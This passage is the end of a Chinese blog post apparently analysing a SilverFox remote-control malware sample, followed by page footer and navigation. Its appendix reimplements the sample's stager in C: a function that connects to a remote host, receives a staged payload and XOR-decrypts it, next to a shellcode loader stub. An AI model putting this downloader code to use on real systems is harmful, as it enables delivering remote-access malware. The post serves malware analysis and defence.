&quot;</span>, p[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 执行 Shellcode (可选，测试用)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] 准备执行 Shellcode...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    VirtualFree(PayloadBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">Payload2Download</span><span class="params">(<span class="type">char</span>* Buffer)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WSAStartup Failed!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (sock == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Socket Failed : %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sockaddr_in ServerAddr;</span><br><span class="line">    ServerAddr.sin_family = AF_INET;</span><br><span class="line">    ServerAddr.sin_port = htons(TARGET_PORT); <span class="comment">// 修正端口</span></span><br><span class="line">    ServerAddr.sin_addr.S_un.S_addr = inet_addr(TARGET_IP);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] 正在连接 %s:%d ...\n&quot;</span>, TARGET_IP, TARGET_PORT);</span><br><span class="line">    <span class="keyword">if</span> (connect(sock, (<span class="type">const</span> sockaddr*)&amp;ServerAddr, <span class="keyword">sizeof</span>(ServerAddr)) == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Connect failed : %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 连接成功！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送握手包 &quot;32&quot; (3字节)</span></span><br><span class="line">    <span class="keyword">if</span> (send(sock, <span class="string">&quot;32&quot;</span>, <span class="number">3</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123; <span class="comment">// 建议发送2字节，或者确保包含&#x27;\0&#x27;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Send failed!\n&quot;</span>);</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 分配临时缓冲 (对应汇编中的 v3)</span></span><br><span class="line">    <span class="type">void</span>* tempBuffer = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x19000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (tempBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Temp Buffer Alloc Failed!\n&quot;</span>);</span><br><span class="line">        closesocket(sock);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> TotalRecvived = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] 开始接收数据...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 模拟汇编：recv 总是写入 tempBuffer</span></span><br><span class="line">        <span class="type">int</span> bytesReceived = recv(sock, (<span class="type">char</span>*)tempBuffer, <span class="number">0x19000</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理非阻塞导致的 -1</span></span><br><span class="line">        <span class="keyword">if</span> (bytesReceived == SOCKET_ERROR) &#123;</span><br><span class="line">            <span class="keyword">if</span> (WSAGetLastError() == WSAEWOULDBLOCK) &#123;</span><br><span class="line">                Sleep(<span class="number">10</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bytesReceived &lt;= <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">// 连接关闭</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 模拟汇编：RtlMoveMemory (memcpy)</span></span><br><span class="line">        <span class="comment">// 将 tempBuffer 的数据搬运到 Buffer + TotalRecvived</span></span><br><span class="line">        <span class="built_in">memcpy</span>(Buffer + TotalRecvived, tempBuffer, bytesReceived);</span><br><span class="line"></span><br><span class="line">        TotalRecvived += bytesReceived;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r[*] 已接收: 0x%X / 0x%X&quot;</span>, TotalRecvived, TOTAL_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (TotalRecvived == TOTAL_SIZE) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n[+] 接收完成，正在解密...\n&quot;</span>);</span><br><span class="line">            DecryptPayload(Buffer, TOTAL_SIZE);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 解密完毕。\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 接收够了，退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理资源</span></span><br><span class="line">    VirtualFree(tempBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (TotalRecvived == TOTAL_SIZE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DecryptPayload</span><span class="params">(<span class="type">char</span>* Buffer, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// 对应汇编：v10 = (_BYTE *)(v9 + 0xE);</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* startDecrypt = (<span class="type">unsigned</span> <span class="type">char</span>*)Buffer + <span class="number">0xE</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0x4B000</span>;</span><br><span class="line">    <span class="type">int</span> keyIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// 获取 Key: *(Buffer + 4 + keyIndex)</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> keyByte = *((<span class="type">unsigned</span> <span class="type">char</span>*)Buffer + <span class="number">4</span> + keyIndex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算异或值: (key % 0x164) + 14</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> xorVal = (keyByte % <span class="number">0x164</span>) + <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行异或</span></span><br><span class="line">        startDecrypt[i] ^= xorVal;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新索引逻辑</span></span><br><span class="line">        <span class="comment">// 汇编逻辑简化：每 10 个字节重置一次索引</span></span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            keyIndex = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            keyIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）</li>
+        <li><strong>Author:</strong> Shad0hun</li>
+        <li><strong>Created at
+                :</strong> 2026-05-04 15:11:41</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-04 19:04:35
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://shad0hun.github.io/2026/05/04/样本分析/【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">#样本分析</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/04/22/AFL/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%BA%8C%EF%BC%89/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">AFL源码分析（二）</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DIE"><span class="nav-text">DIE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E5%89%8D%E7%BD%AE%E5%87%86%E5%A4%87"><span class="nav-text">1.前置准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-payload%E5%8A%A0%E8%BD%BD%EF%BC%88sub-4030A9%EF%BC%89"><span class="nav-text">2.payload加载（sub_4030A9）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F-payload%E6%89%A7%E8%A1%8C%EF%BC%88sub-403C84%EF%BC%89"><span class="nav-text">3.安装程序&#x2F;payload执行（sub_403C84）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sub-40140B"><span class="nav-text">sub_40140B</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#func-NSIS-VM"><span class="nav-text">func_NSIS_VM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-NSIS%E6%8C%87%E4%BB%A4%E6%8F%90%E5%8F%96%E5%88%86%E6%9E%90"><span class="nav-text">4.NSIS指令提取分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E9%87%8A%E6%94%BE%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-text">5.释放文件分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E7%99%BD%E5%8A%A0%E9%BB%91%E5%88%86%E6%9E%90"><span class="nav-text">6.白加黑分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-Utility-dll%E5%88%86%E6%9E%90%EF%BC%88CreateTipsManager%EF%BC%89"><span class="nav-text">7.Utility.dll分析（CreateTipsManager）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ByPass-Windows-Defender"><span class="nav-text">&lt;1&gt;.ByPass Windows Defender</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%EF%BC%8C%E4%BB%A5%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E5%90%AF%E5%8A%A8"><span class="nav-text">&lt;2&gt;.提权，以用户身份启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">&lt;3&gt;.启动服务，回调函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#StartAddress"><span class="nav-text">&lt;4&gt;.StartAddress</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-ShellCode%E5%88%86%E6%9E%90"><span class="nav-text">8.ShellCode分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-Payload2%E5%88%86%E6%9E%90"><span class="nav-text">9.Payload2分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10%E6%9C%80%E7%BB%88%E8%BD%BD%E8%8D%B7%E5%88%86%E6%9E%90"><span class="nav-text">10最终载荷分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%99%84%E5%BD%95"><span class="nav-text">附录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-ShellCode-Loader"><span class="nav-text">1.ShellCode Loader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-ShellCode-analyze"><span class="nav-text">2.ShellCode analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Pyload2-Load"><span class="nav-text">3.Pyload2_Load</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Shad0hun</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        23 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
